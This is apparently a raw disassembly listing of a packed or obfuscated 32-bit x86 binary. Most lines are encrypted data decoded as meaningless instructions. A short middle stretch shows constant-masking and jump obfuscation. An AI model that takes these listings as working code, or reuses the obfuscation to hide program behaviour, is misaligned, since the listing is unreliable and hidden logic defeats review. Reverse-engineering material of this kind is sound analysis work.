  40fe10:	pop    ds
  40fe11:	push   ecx
  40fe12:	inc    eax
  40fe13:	test   al,0xe0
  40fe15:	jge    0x40fe0e
  40fe17:	xlat   BYTE PTR ds:[ebx]
  40fe18:	and    ebp,DWORD PTR [edx]
  40fe1a:	adc    DWORD PTR [eax-0x628774b5],ebx
  40fe20:	addr16 cmp esi,esi
  40fe23:	mov    esi,0x4c548773
  40fe28:	xor    cl,BYTE PTR [ecx-0x79]
  40fe2b:	inc    BYTE PTR [edx-0x70]
  40fe2e:	adc    eax,0x4b38d22e
  40fe33:	jne    0x40fe9e
  40fe35:	cmp    ebx,esi
  40fe37:	mov    eax,0xd9e1b4e0
  40fe3c:	sub    DWORD PTR [ecx-0x1e],ecx
  40fe3f:	pop    esp
  40fe40:	xchg   ebp,eax
  40fe41:	in     eax,0x2e
  40fe43:	mov    ebp,0xdf355a0d
  40fe48:	popf   
  40fe49:	push   ss
  40fe4a:	pop    ds
  40fe4b:	hlt    
  40fe4c:	fs xchg ecx,eax
  40fe4e:	lahf   
  40fe4f:	cmc    
  40fe50:	dec    edx
  40fe51:	retf   
  40fe52:	aas    
  40fe53:	adc    ebp,edi
  40fe55:	in     eax,dx
  40fe56:	xor    BYTE PTR [edi-0x1f],0x45
  40fe5a:	call   0xca04:0xe8d03eb
  40fe61:	in     al,dx
  40fe62:	sub    al,0xe2
  40fe64:	mov    ecx,0xa1b0c829
  40fe69:	lock sbb esp,0xfffffff6
  40fe6d:	push   0x5d
  40fe6f:	jno    0x40fe23
  40fe71:	out    0xca,al
  40fe73:	cmc    
  40fe74:	mov    BYTE PTR [esp+eax*4],dh
  40fe77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe78:	fucom  st(1)
  40fe7a:	mov    ch,0x3b
  40fe7c:	dec    esi
  40fe7d:	adc    bl,dl
  40fe7f:	sub    dl,BYTE PTR [edx+0x66]
  40fe82:	jbe    0x40fe2f
  40fe84:	(bad)  
  40fe85:	push   eax
  40fe86:	mov    ds,WORD PTR [ecx]
  40fe88:	or     ebx,DWORD PTR [ebp+0x3fc11e8a]
  40fe8e:	or     esi,DWORD PTR ds:0xb94d5c03
  40fe94:	xchg   ecx,eax
  40fe95:	sbb    ch,al
  40fe97:	clc    
  40fe98:	mov    esi,edi
  40fe9a:	sub    edx,DWORD PTR [edx+0x2d81e734]
  40fea0:	xchg   edx,eax
  40fea1:	dec    edx
  40fea2:	jl     0x40fecf
  40fea4:	sub    BYTE PTR ds:0xcc44c868,cl
  40feaa:	mov    esi,0xd04d893c
  40feaf:	(bad)  
  40feb0:	dec    esp
  40feb1:	sbb    al,0xae
  40feb3:	int    0xf5
  40feb5:	push   0xc753909f
  40feba:	mov    dl,0xd6
  40febc:	out    0xa7,al
  40febe:	dec    edi
  40febf:	mov    eax,0x4c5d33d
  40fec4:	mov    esp,0x4175189c
  40fec9:	test   DWORD PTR [esi],edi
  40fecb:	ss jmp 0x84aa:0x830676f0
  40fed3:	ror    BYTE PTR [eax],cl
  40fed5:	sar    BYTE PTR [ecx+0x73],cl
  40fed8:	dec    esp
  40fed9:	xlat   BYTE PTR ds:[ebx]
  40feda:	scas   al,BYTE PTR es:[edi]
  40fedb:	dec    esi
  40fedc:	jnp    0x40fec6
  40fede:	mov    dh,0xe3
  40fee0:	or     cl,BYTE PTR [esi+0x26]
  40fee3:	mov    bh,0x2d
  40fee5:	iret   
  40fee6:	sbb    BYTE PTR [ecx+0xd6addbd],cl
  40feec:	jae    0x40ff4a
  40feee:	call   0xc31b8cff
  40fef3:	inc    ecx
  40fef4:	sub    esp,esp
  40fef6:	jp     0x40feae
  40fef8:	cmp    DWORD PTR [ecx+0x3e],esi
  40fefb:	cmc    
  40fefc:	in     eax,0xed
  40fefe:	stos   DWORD PTR es:[edi],eax
  40feff:	icebp  
  40ff00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff01:	jb     0x40ff0d
  40ff03:	or     BYTE PTR [eax+0x66],0x6e
  40ff07:	iret   
  40ff08:	mov    ah,dh
  40ff0a:	mov    bh,al
  40ff0c:	(bad)  
  40ff0d:	push   ecx
  40ff0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff0f:	pushf  
  40ff10:	into   
  40ff11:	xchg   ecx,eax
  40ff12:	pusha  
  40ff13:	sbb    ebp,DWORD PTR [ebx+0x44]
  40ff16:	mov    ebx,0xdfe1704b
  40ff1b:	lahf   
  40ff1c:	and    DWORD PTR ds:0xca465b49,esp
  40ff22:	stos   BYTE PTR es:[edi],al
  40ff23:	repz clc 
  40ff25:	xor    al,0x9d
  40ff27:	ds stc 
  40ff29:	or     BYTE PTR ds:0xf7daf0b1,ah
  40ff2f:	xchg   esi,eax
  40ff30:	lods   eax,DWORD PTR ds:[esi]
  40ff31:	mov    esi,0x23c3d32
  40ff36:	inc    eax
  40ff37:	in     al,0xb7
  40ff39:	or     ch,BYTE PTR [edx]
  40ff3b:	loop   0x40ff35
  40ff3d:	inc    edx
  40ff3e:	or     bl,BYTE PTR ds:0xbc098b6d
  40ff44:	icebp  
  40ff45:	pop    eax
  40ff46:	sub    eax,0x295e546b
  40ff4b:	cmp    eax,0x81d98e50
  40ff50:	sub    ebp,0xad90cbef
  40ff56:	ror    al,1
  40ff58:	cdq    
  40ff59:	pop    esp
  40ff5a:	jmp    0x9426:0xd2878fc1
  40ff61:	mov    esi,DWORD PTR [ecx-0x80]
  40ff64:	sbb    al,0x15
  40ff66:	daa    
  40ff67:	ficom  WORD PTR [ebx+eiz*4+0x1f]
  40ff6b:	push   cs
  40ff6c:	mov    bh,0xb4
  40ff6e:	xchg   DWORD PTR [esi],ebx
  40ff70:	ja     0x40fef2
  40ff72:	lods   al,BYTE PTR ds:[esi]
  40ff73:	pop    es
  40ff74:	mov    cl,0xd7
  40ff77:	dec    esi
  40ff78:	imul   ebx,edx,0xffffffc6
  40ff7b:	(bad)  
  40ff7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff7d:	jmp    0xa17869b6
  40ff82:	les    edx,FWORD PTR [ebx-0x1e656edd]
  40ff88:	jno    0x40ff22
  40ff8a:	lahf   
  40ff8b:	popf   
  40ff8c:	pop    es
  40ff8d:	loope  0x40ff5b
  40ff8f:	imul   esp,DWORD PTR [ebp+0x460b03f8],0x8bef9558
  40ff99:	repnz fcom QWORD PTR [ebx-0x849c125]
  40ffa0:	xor    dl,bh
  40ffa2:	enter  0x3bb5,0x2b
  40ffa6:	jb     0x41000e
  40ffa8:	call   edi
  40ffaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffab:	pop    edx
  40ffac:	call   DWORD PTR [edx]
  40ffae:	and    al,0xbc
  40ffb0:	outs   dx,DWORD PTR ds:[esi]
  40ffb1:	fld    DWORD PTR [ecx+0x7a]
  40ffb4:	arpl   WORD PTR [esi+0x6cb179e7],si
  40ffba:	dec    ebx
  40ffbb:	outs   dx,BYTE PTR ds:[esi]
  40ffbc:	cwde   
  40ffbd:	test   DWORD PTR [esi+ebx*4+0x43eae05],ecx
  40ffc4:	or     edi,ebp
  40ffc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffc7:	repz (bad) 
  40ffc9:	jnp    0x40ffa6
  40ffcb:	push   ss
  40ffcc:	dec    edx
  40ffcd:	mov    al,ds:0x5d0adcdf
  40ffd2:	push   edx
  40ffd3:	or     dh,BYTE PTR [esi+0x3b2e34f7]
  40ffd9:	hlt    
  40ffda:	mov    ebp,0xf1165386
  40ffdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffe0:	pop    ss
  40ffe1:	xor    BYTE PTR [eax],cl
  40ffe3:	add    bl,BYTE PTR [bx-0x17]
  40ffe7:	lods   eax,DWORD PTR ds:[esi]
  40ffe8:	lods   al,BYTE PTR ds:[esi]
  40ffe9:	pop    esi
  40ffea:	pop    ecx
  40ffeb:	sti    
  40ffec:	leave  
  40ffed:	cmp    eax,0xaa22e0a7
  40fff2:	lea    ebx,[eax]
  40fff4:	arpl   WORD PTR [ebp+0x45],dx
  40fff7:	sbb    edx,DWORD PTR [ecx-0x64]
  40fffa:	aaa    
  40fffb:	sub    DWORD PTR [eax],esp
  40fffd:	add    bl,ch
  40ffff:	pop    ebx
  410000:	inc    esi
  410001:	(bad)  
  410002:	div    BYTE PTR [ecx-0x7f7a67c3]
  410008:	mov    ecx,0xa2f5a23f
  41000d:	in     eax,dx
  41000e:	or     ah,bh
  410010:	mov    ds:0xbb3a3f52,al
  410015:	in     al,0x27
  410017:	int    0x4
  410019:	sahf   
  41001a:	xor    eax,0x1bf364a7
  41001f:	jge    0x41008b
  410021:	dec    esi
  410022:	jns    0x41007d
  410024:	(bad)  
  410026:	ret    0xc53e
  410029:	mov    ds:0xff089416,eax
  41002e:	mov    cl,0x68
  410030:	xchg   edi,eax
  410031:	cs xchg edi,eax
  410033:	sbb    ebx,DWORD PTR [ebp-0x4d]
  410036:	pop    ds
  410037:	outs   dx,BYTE PTR ds:[esi]
  410038:	or     al,0x3
  41003a:	xor    BYTE PTR [edx],0x66
  41003d:	cli    
  41003e:	pop    esi
  41003f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410040:	bt     ecx,esp
  410043:	pop    ebx
  410044:	adc    al,0xb2
  410046:	sub    cl,dh
  410048:	cld    
  410049:	mov    eax,ds:0xc603c4ee
  41004e:	add    dh,BYTE PTR [ebp+0x74]
  410051:	push   edx
  410052:	add    DWORD PTR ds:0xf0f28dd5,eax
  410058:	xchg   edi,eax
  410059:	cwde   
  41005a:	dec    esi
  41005b:	jae    0x410058
  41005d:	mov    edi,0x27a414e2
  410062:	add    BYTE PTR [ecx-0x335eda0b],al
  410068:	inc    edx
  410069:	(bad)  
  41006a:	sub    ebp,DWORD PTR [eax-0x2]
  41006d:	or     BYTE PTR [eax-0xc],dl
  410070:	xchg   ebx,eax
  410071:	out    dx,eax
  410072:	and    BYTE PTR [ebx],bh
  410074:	and    BYTE PTR fs:[eax-0x17],ch
  410078:	int3   
  410079:	and    eax,0xc880634a
  41007e:	cdq    
  41007f:	out    dx,eax
  410080:	and    BYTE PTR [esi-0x61b639a],0x98
  410087:	and    al,0xed
  410089:	stos   BYTE PTR es:[edi],al
  41008a:	sar    BYTE PTR [edi+edi*1+0x69fb92b1],1
  410091:	mov    ebp,0x7b9aa2fa
  410096:	imul   edx,DWORD PTR [ebp+0x5af3a054],0x59
  41009d:	sub    BYTE PTR [ebx+0x61fcf061],0xb5
  4100a4:	push   0xad08db5b
  4100a9:	ja     0x4100aa
  4100ab:	sbb    al,0xb
  4100ad:	mov    esp,0x6c5f4bd4
  4100b2:	mov    ebx,esp
  4100b4:	sbb    DWORD PTR [edi],0x5f
  4100b7:	mov    dl,0x9
  4100b9:	sbb    BYTE PTR [ebx-0x399fd833],dl
  4100bf:	cmp    BYTE PTR [esi+eax*1-0x36cb4f88],al
  4100c6:	cmp    al,0xe0
  4100c8:	and    eax,0xffffffff
  4100cb:	mov    edx,0x212a8fb7
  4100d0:	shl    DWORD PTR [edi-0x46],1
  4100d3:	mov    ebx,0xb4f89aed
  4100d8:	pop    ecx
  4100d9:	adc    eax,0x4e3f20c3
  4100de:	fld    QWORD PTR [edx+0x66cd0fdb]
  4100e4:	lahf   
  4100e5:	out    0xc7,al
  4100e7:	pop    ds
  4100e8:	mov    esp,0xf2059786
  4100ed:	pop    ss
  4100ee:	(bad)  
  4100ef:	mov    edx,0x9b1f2197
  4100f4:	mov    al,ds:0x73b24b4a
  4100f9:	mov    al,ds:0x96a2640
  4100fe:	in     al,dx
  4100ff:	aam    0x13
  410101:	outs   dx,BYTE PTR ds:[esi]
  410102:	jg     0x4100c4
  410104:	pop    edi
  410105:	push   es
  410106:	push   edx
  410107:	div    BYTE PTR [ebx]
  410109:	xor    eax,0xa40141fc
  41010e:	int3   
  41010f:	test   al,0x69
  410111:	(bad)  
  410112:	jmp    0xf99f221b
  410117:	add    eax,0x8f64e56e
  41011c:	dec    eax
  41011d:	retf   
  41011e:	sbb    WORD PTR [edi+edi*8-0x5c],0xb663
  410125:	(bad)  
  410126:	js     0x4100ba
  410128:	jp     0x4100c5
  41012a:	sub    esp,DWORD PTR [ecx]
  41012c:	sub    dl,bl
  41012e:	stos   BYTE PTR es:[edi],al
  41012f:	sub    eax,0x4e39c4fc
  410134:	shl    eax,1
  410136:	jmp    0xf3f9456c
  41013b:	mov    al,ds:0x798762d2
  410140:	mov    dh,0x98
  410142:	inc    edi
  410143:	fst    QWORD PTR [ebp-0x1e]
  410146:	mov    ds:0x6e67ff98,al
  41014b:	jmp    0xb183:0x89600db0
  410152:	clc    
  410153:	add    al,0x47
  410155:	sbb    BYTE PTR [edi],dh
  410157:	pop    esi
  410158:	das    
  410159:	mov    edx,DWORD PTR [esi+0x49]
  41015c:	repnz pop si
  41015f:	sbb    edx,DWORD PTR ds:0x91673d54
  410165:	mov    dh,0xc2
  410167:	add    cl,BYTE PTR [esi-0x58301464]
  41016d:	retf   
  41016e:	dec    esi
  41016f:	jb     0x410164
  410171:	mov    al,0xc
  410173:	push   edx
  410174:	pop    esp
  410175:	adc    ebx,ecx
  410177:	call   0xfa38d836
  41017c:	int3   
  41017d:	int    0x6b
  41017f:	add    DWORD PTR [ebx-0x37],eax
  410182:	ins    BYTE PTR es:[edi],dx
  410183:	pop    ebp
  410184:	cld    
  410185:	loop   0x4101b4
  410187:	fwait
  410188:	sar    BYTE PTR [esp+esi*4],1
  41018b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41018c:	cmp    ebp,DWORD PTR [edx-0x3b540f80]
  410192:	or     al,0x93
  410194:	(bad)  
  410196:	std    
  410197:	iret   
  410198:	or     eax,0x66e22ff5
  41019d:	or     edi,0x49
  4101a0:	inc    ecx
  4101a1:	aam    0x7d
  4101a3:	sahf   
  4101a4:	imul   eax,DWORD PTR [ebp+0x5e],0xf1e11532
  4101ab:	cmp    al,0x4c
  4101ad:	nop
  4101ae:	push   eax
  4101af:	stc    
  4101b0:	cdq    
  4101b1:	cld    
  4101b2:	retf   0x9693
  4101b5:	repz push ebp
  4101b7:	push   esp
  4101b8:	ds nop
  4101ba:	dec    ebp
  4101bb:	mov    ch,0xc8
  4101bd:	mov    dl,0xd5
  4101bf:	dec    ebp
  4101c0:	scas   eax,DWORD PTR es:[edi]
  4101c1:	push   es
  4101c2:	cmc    
  4101c3:	xchg   edx,eax
  4101c4:	ficom  DWORD PTR [esi]
  4101c6:	out    0x16,eax
  4101c8:	pop    edx
  4101c9:	repnz cli 
  4101cb:	lods   al,BYTE PTR ds:[esi]
  4101cc:	xchg   cl,dl
  4101ce:	pop    ebx
  4101cf:	retf   0x2506
  4101d2:	daa    
  4101d3:	enter  0x6ee2,0x1c
  4101d7:	loopne 0x410206
  4101d9:	cmp    DWORD PTR [ebx-0x7d],edi
  4101dc:	leave  
  4101dd:	sbb    DWORD PTR [edx+0x5d9a673e],edi
  4101e3:	(bad)  
  4101e4:	cdq    
  4101e5:	jb     0x410248
  4101e7:	inc    eax
  4101e8:	xchg   edx,eax
  4101e9:	pop    ds
  4101ea:	outs   dx,BYTE PTR ds:[esi]
  4101eb:	xchg   edi,eax
  4101ec:	and    ebx,ecx
  4101ee:	test   DWORD PTR [edi+0x3b],esp
  4101f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101f2:	push   ecx
  4101f3:	loopne 0x4101bb
  4101f5:	jno    0x4101f6
  4101f7:	jne    0x410272
  4101f9:	(bad)  
  4101fa:	xor    al,0xf2
  4101fc:	and    ah,bh
  4101fe:	in     eax,0x82
  410200:	sub    dl,BYTE PTR [edi]
  410202:	sti    
  410203:	mov    ah,0xcc
  410205:	push   cs
  410206:	mov    ah,0x94
  410208:	retf   0x792f
  41020b:	jno    0x41027d
  41020d:	popf   
  41020e:	into   
  41020f:	mov    ds:0x20ab27be,al
  410214:	mov    dh,0xab
  410216:	add    ah,dh
  410218:	gs jg  0x410212
  41021b:	mov    ch,0xbf
  41021d:	or     al,0x28
  41021f:	in     al,dx
  410220:	mov    edi,0xdfc0197b
  410225:	in     al,0xdf
  410227:	xchg   edi,eax
  410228:	cmp    al,0xa2
  41022a:	dec    ebx
  41022b:	adc    eax,0x219c7524
  410230:	sbb    DWORD PTR [ecx+0x7c],ebp
  410233:	and    BYTE PTR [ebx-0x6d],bh
  410236:	inc    esp
  410237:	push   ebx
  410238:	fsub   QWORD PTR [esi-0x4c]
  41023b:	mov    es,WORD PTR [ebx]
  41023d:	(bad)  
  41023e:	imul   eax,ebx
  410241:	cmp    eax,edx
  410243:	ja     0x4191d2
  410249:	mov    edx,DWORD PTR [ebp-0x10]
  41024c:	mov    eax,DWORD PTR [ebp-0x14]
  41024f:	mov    ebx,DWORD PTR [ebp-0x28]
  410252:	sub    eax,edx
  410254:	xor    ebx,esi
  410256:	xor    edx,edx
  410258:	add    ebx,edi
  41025a:	div    ebx
  41025c:	mov    DWORD PTR [ebp-0x8],eax
  41025f:	mov    eax,DWORD PTR [ebp-0x2c]
  410262:	mov    edx,DWORD PTR [ebp-0x8]
  410265:	xor    eax,esi
  410267:	add    eax,edi
  410269:	cmp    edx,eax
  41026b:	jbe    0x41027b
  410271:	mov    eax,DWORD PTR [ebp-0x2c]
  410274:	xor    eax,esi
  410276:	add    eax,edi
  410278:	mov    DWORD PTR [ebp-0x8],eax
  41027b:	mov    eax,DWORD PTR [ebp-0x28]
  41027e:	mov    edx,DWORD PTR [ebp-0x8]
  410281:	xor    eax,esi
  410283:	add    eax,edi
  410285:	imul   eax,edx
  410288:	mov    DWORD PTR [ebp-0x8],eax
  41028b:	mov    eax,DWORD PTR [ebp-0x3c]
  41028e:	mov    edx,DWORD PTR [ebp-0x8]
  410291:	xor    eax,esi
  410293:	add    eax,edi
  410295:	cmp    edx,eax
  410297:	je     0x4191bb
  41029d:	mov    eax,DWORD PTR [ebp-0x8]
  4102a0:	mov    DWORD PTR [ebp-0x20],eax
  4102a3:	mov    eax,DWORD PTR [ebp-0x10]
  4102a6:	add    eax,DWORD PTR [ebp-0x40]
  4102a9:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  4102b0:	mov    DWORD PTR [ebp-0x8],eax
  4102b3:	mov    eax,0xf89c85b5
  4102b8:	mov    DWORD PTR [ebp-0x1c],eax
  4102bb:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  4102c2:	mov    DWORD PTR [ebp-0x30],eax
  4102c5:	mov    eax,DWORD PTR [ebp-0x24]
  4102c8:	xor    eax,esi
  4102ca:	add    eax,edi
  4102cc:	jmp    0x416dfa
  4102d1:	mov    DWORD PTR [ebp-0x48],0xf89c85be
  4102d8:	mov    DWORD PTR [ebp-0x4c],0xf89c85a1
  4102df:	mov    eax,DWORD PTR [ebp-0x30]
  4102e2:	mov    edx,DWORD PTR [ebp-0xc]
  4102e5:	xor    eax,esi
  4102e7:	add    eax,edi
  4102e9:	imul   eax,edx
  4102ec:	mov    edx,DWORD PTR [ebp-0x1c]
  4102ef:	xor    edx,esi
  4102f1:	add    eax,edx
  4102f3:	mov    edx,DWORD PTR [ebp-0x8]
  4102f6:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  4102fd:	mov    BYTE PTR [ebp-0x1],al
  410300:	mov    eax,DWORD PTR [ebp-0x1c]
  410303:	mov    edx,DWORD PTR [ebp-0x1c]
  410306:	xor    eax,esi
  410308:	xor    edx,esi
  41030a:	lea    ebx,[eax+edx*1+0x64e5b6]
  410311:	mov    eax,DWORD PTR [ebp-0xc]
  410314:	xor    edx,edx
  410316:	div    ebx
  410318:	mov    eax,DWORD PTR [ebp-0x1c]
  41031b:	xor    eax,esi
  41031d:	add    eax,edi
  41031f:	cmp    edx,eax
  410321:	mov    eax,DWORD PTR [ebp-0x30]
  410324:	mov    edx,DWORD PTR [ebp-0xc]
  410327:	jmp    0x41269c
  41032c:	lods   al,BYTE PTR ds:[esi]
  41032d:	jbe    0x410322
  41032f:	loop   0x4102d4
  410331:	jmp    DWORD PTR [ebx-0x2d50dedc]
  410337:	into   
  410338:	push   0xbfe3db21
  41033d:	mov    fs,WORD PTR [edx+0x62]
  410340:	or     bl,BYTE PTR [edi+0x62]
  410343:	bound  esi,QWORD PTR [edx]
  410345:	sbb    al,0x44
  410347:	in     eax,0x54
  410349:	dec    edx
  41034a:	cmp    DWORD PTR [esi+0x229d2c31],esi
  410350:	ret    0xc56a
  410353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410354:	fwait
  410355:	add    eax,ebx
  410357:	mov    edx,0x4de8fc14
  41035c:	icebp  
  41035d:	and    al,0xfe
  41035f:	add    dh,0x3
  410362:	or     DWORD PTR [edx+0x1b],edi
  410365:	xchg   ecx,eax
  410366:	dec    esp
  410367:	xchg   esi,eax
  410368:	lock add dl,BYTE PTR [esi+0x2ff8036a]
  41036f:	jnp    0x410386
  410371:	sbb    eax,0xb7d7d1c
  410376:	sbb    al,0xb5
  410378:	jne    0x410374
  41037a:	and    eax,DWORD PTR [esi+0x6e]
  41037d:	imul   ebp,DWORD PTR ds:0x12c89836,0x7b
  410384:	sub    eax,0xed400c8b
  410389:	mov    al,ds:0x6254cc1c
  41038e:	mov    edi,0xaa7d69df
  410393:	stc    
  410394:	mov    dl,ch
  410396:	int3   
  410397:	pop    edi
  410398:	xchg   ebx,eax
  410399:	sub    al,0x11
  41039b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41039c:	mov    esp,0x94019037
  4103a1:	mov    edi,0x284215ad
  4103a6:	mov    esi,0x48550c2e
  4103ab:	jo     0x410428
  4103ad:	sahf   
  4103ae:	xlat   BYTE PTR ds:[ebx]
  4103af:	fimul  DWORD PTR ds:0xd071e9c3
  4103b5:	xchg   ebp,eax
  4103b6:	push   0x55fe665d
  4103bb:	int3   
  4103bc:	shl    BYTE PTR [edx],0x6a
  4103bf:	or     ah,BYTE PTR [esi+0x4c]
  4103c2:	clc    
  4103c3:	cwde   
  4103c4:	xor    eax,0xee0fcda4
  4103c9:	sbb    ebp,DWORD PTR [ebx]
  4103cb:	mov    al,ds:0x61bac8bc
  4103d0:	push   ds
  4103d1:	in     al,dx
  4103d2:	es push ebp
  4103d4:	fs add al,0x2e
  4103d7:	fldcw  WORD PTR [edi-0x65d56bf3]
  4103dd:	xlat   BYTE PTR ds:[ebx]
  4103de:	imul   esi,eax,0xf0fd9c29
  4103e4:	jo     0x410408
  4103e6:	inc    ecx
  4103e7:	addr16 and esp,edx
  4103ea:	fcmove st,st(7)
  4103ec:	pushf  
  4103ed:	mov    edi,0x8b7bf65a
  4103f2:	mov    BYTE PTR ss:[edx+0x2b53d243],dl
  4103f9:	xor    BYTE PTR [edi],bl
  4103fb:	mov    ebp,0xc2f65ddb
  410400:	lock (bad) 
  410402:	leave  
  410403:	add    eax,0x8f1a0038
  410408:	add    DWORD PTR [eax+ecx*1],eax
  41040b:	mov    fs,WORD PTR [eax-0x12]
  41040e:	addr16 fcmovu st,st(6)
  410411:	loope  0x41042d
  410413:	ins    BYTE PTR es:[edi],dx
  410414:	pusha  
  410415:	xor    ebp,DWORD PTR [eax+0x69]
  410418:	mov    esi,0xd5ea7f53
  41041d:	std    
  41041e:	add    DWORD PTR [eax],0x1d
  410421:	or     al,0x17
  410423:	pop    edi
  410424:	sub    dl,bl
  410426:	stos   BYTE PTR es:[edi],al
  410427:	imul   esp,DWORD PTR [ecx],0xd32355d3
  41042d:	push   eax
  41042e:	test   al,0xd
  410430:	call   0x1cf1:0x9ece8829
  410437:	add    eax,DWORD PTR [ebp+ebp*1+0x637df495]
  41043e:	xor    BYTE PTR [ebp+0x40],dh
  410441:	outs   dx,BYTE PTR ds:[esi]
  410442:	shl    BYTE PTR [edi],0x31
  410445:	scas   eax,DWORD PTR es:[edi]
  410446:	add    al,0x2f
  410448:	xchg   esp,eax
  410449:	inc    edi
  41044a:	mov    ebp,0x3f94a4be
  41044f:	popf   
  410450:	jns    0x410481
  410452:	mov    ch,0x42
  410454:	sub    ah,dh
  410456:	adc    eax,0xdd6782d
  41045b:	inc    ebp
  41045c:	test   DWORD PTR [ebx+0x69],ebx
  41045f:	jecxz  0x41047b
  410461:	outs   dx,BYTE PTR ds:[esi]
  410462:	pop    ebp
  410463:	xor    ebx,DWORD PTR [ebx]
  410465:	xchg   esi,eax
  410466:	stos   BYTE PTR es:[edi],al
  410467:	jne    0x410436
  410469:	mov    eax,es:0x425ee9
  41046f:	xor    eax,0x5830fa42
  410474:	sub    al,0x49
  410476:	popf   
  410477:	(bad)  
  410478:	sub    al,0x0
  41047a:	dec    edx
  41047b:	pop    edx
  41047c:	jb     0x4104d9
  41047e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41047f:	fadd   DWORD PTR [ebx]
  410481:	repnz and BYTE PTR [eax-0x3f],ah
  410485:	sub    BYTE PTR ds:0xa781e193,0xb8
  41048c:	dec    ebx
  41048d:	jecxz  0x410443
  41048f:	scas   al,BYTE PTR es:[edi]
  410490:	pop    es
  410491:	shl    DWORD PTR [edi+0x73],0xa4
  410495:	adc    BYTE PTR [eax],ah
  410497:	enter  0xdd85,0x4a
  41049b:	and    BYTE PTR [edx],bh
  41049d:	ss inc esp
  41049f:	mov    ch,0x1d
  4104a1:	inc    ebp
  4104a2:	jne    0x410426
  4104a4:	mov    ch,0x3b
  4104a6:	ja     0x4104a8
  4104a8:	inc    ebp
  4104a9:	jno    0x4104ec
  4104ab:	add    dh,BYTE PTR [esi+0x13]
  4104ae:	pop    ebx
  4104af:	in     al,dx
  4104b0:	mov    ecx,0x88da6a93
  4104b5:	xor    dl,BYTE PTR [edi-0x5]
  4104b8:	ss or  ch,0x6e
  4104bc:	sub    eax,0xd2b17f61
  4104c1:	sub    al,0x1b
  4104c3:	sub    BYTE PTR [ebx+0x640b3ac5],dh
  4104c9:	(bad)  
  4104ca:	sub    eax,0xac69a4f5
  4104cf:	and    eax,0xc1219272
  4104d4:	inc    eax
  4104d5:	jmp    0x38b2c702
  4104da:	pop    es
  4104db:	dec    edi
  4104dc:	mov    ds:0xdd13deee,al
  4104e1:	fldenv [esi-0x37]
  4104e4:	and    ecx,DWORD PTR [esi+0x488680b2]
  4104ea:	out    dx,al
  4104eb:	call   0x498a:0x3006b4d7
  4104f2:	hlt    
  4104f3:	or     al,0x1e
  4104f5:	out    0x4b,al
  4104f7:	fidiv  DWORD PTR [ecx]
  4104f9:	pop    esi
  4104fa:	mov    dl,0x40
  4104fc:	cmp    ecx,DWORD PTR [ecx+0x5d]
  4104ff:	jge    0x4104df
  410501:	ds js  0x4104df
  410504:	fwait
  410505:	inc    esi
  410506:	rol    BYTE PTR [esi+esi*2],1
  410509:	inc    edi
  41050b:	push   ebx
  41050c:	jns    0x410536
  41050e:	pop    ss
  41050f:	clc    
  410510:	inc    ebp
  410511:	fdivr  DWORD PTR [ecx+0x53d3e047]
  410517:	cmp    eax,DWORD PTR [edx]
  410519:	push   cs
  41051a:	fdiv   DWORD PTR [eax-0x2f]
  41051d:	add    eax,0x39d497b1
  410522:	xchg   esp,eax
  410523:	push   ss
  410524:	in     eax,0xcb
  410526:	fdivp  st(1),st
  410528:	das    
  410529:	sub    DWORD PTR [edi],edx
  41052b:	sub    cl,BYTE PTR [esi-0xb2efcb0]
  410531:	mov    ebp,0x4c2809b5
  410536:	sar    DWORD PTR [eax-0x7121bd86],cl
  41053c:	mov    ah,bl
  41053e:	lods   eax,DWORD PTR ds:[esi]
  41053f:	cmp    DWORD PTR [eax+eax*1+0xc],esi
  410543:	js     0x410538
  410545:	sbb    ch,BYTE PTR [esi+0x7970f1d1]
  41054b:	and    DWORD PTR [esi],0xa809b5fd
  410551:	in     eax,0xe6
  410553:	dec    ebp
  410554:	retf   0x68c2
  410557:	or     al,0xbd
  410559:	cmp    al,0x50
  41055b:	mov    ebx,0xc06bab7a
  410560:	retf   0xc92b
  410563:	mov    eax,0x3adce220
  410568:	(bad)  
  410569:	hlt    
  41056a:	in     eax,dx
  41056b:	in     eax,dx
  41056c:	xor    al,0x9d
  41056e:	xchg   ecx,eax
  41056f:	push   edi
  410570:	out    0x49,al
  410572:	and    eax,0xbceb0e98
  410577:	ret    0x4b11
  41057a:	mov    bh,0xb1
  41057c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41057d:	pop    ecx
  41057e:	or     al,0xb
  410580:	mov    al,0xf0
  410582:	ins    BYTE PTR es:[edi],dx
  410583:	fld    QWORD PTR [eax]
  410585:	push   cs
  410586:	fxch   st(6)
  410588:	sub    ebp,DWORD PTR [esi-0x26]
  41058b:	mov    DWORD PTR [esi-0x54],ebp
  41058e:	push   esp
  41058f:	push   cs
  410590:	ret    0x6995
  410593:	dec    esi
  410594:	pusha  
  410595:	cmp    dl,BYTE PTR [esi-0x62]
  410598:	std    
  410599:	into   
  41059a:	add    ebp,ecx
  41059c:	popf   
  41059d:	push   esp
  41059e:	push   0x4b3d3b4
  4105a3:	clc    
  4105a4:	je     0x41058e
  4105a6:	sbb    BYTE PTR [eax],bl
  4105a8:	adc    ah,BYTE PTR [edx+0x1c]
  4105ab:	repz das 
  4105ad:	xchg   edi,eax
  4105ae:	ins    DWORD PTR es:[edi],dx
  4105af:	jb     0x4105b2
  4105b1:	pop    ecx
  4105b2:	je     0x4105b8
  4105b4:	and    bl,BYTE PTR [eax-0x6b169635]
  4105ba:	xor    BYTE PTR [ebp-0x5bbc6af8],ah
  4105c0:	add    dh,BYTE PTR [ebp-0x7047311f]
  4105c6:	icebp  
  4105c7:	in     al,dx
  4105c8:	mov    ecx,0x405c7010
  4105cd:	ret    0x5d31
